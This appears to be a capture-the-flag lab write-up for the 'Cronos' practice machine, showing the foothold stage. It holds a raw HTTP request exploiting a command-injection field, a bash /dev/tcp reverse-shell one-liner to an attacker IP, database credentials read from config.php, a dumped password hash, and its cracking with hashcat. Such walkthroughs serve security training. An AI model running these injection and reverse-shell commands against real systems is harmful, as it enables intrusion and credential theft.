# Foothold
## Reverse Shell

### The POST request
```
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://admin.cronos.htb
Connection: close
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=bfaodntocohp2c7vqn8731k3s4
Upgrade-Insecure-Requests: 1
command=sleep+5&host=
```

- Reverse Shell payload
```bash 
bash -c 'bash -i  >& /dev/tcp/10.10.14.5/9001 0>&1' 
``` 
![[Pasted image 20210329061212.png]]

## Current User
- Currently as www-data. Cat out config.php
 ```php
 <?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>

```
- Query admin.users table
```mysql
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.01 sec)

mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)

```
- MD5 hash. Crack using hashcat : **admin**:**1327663704**, but doesn't work other user.
- User named noulis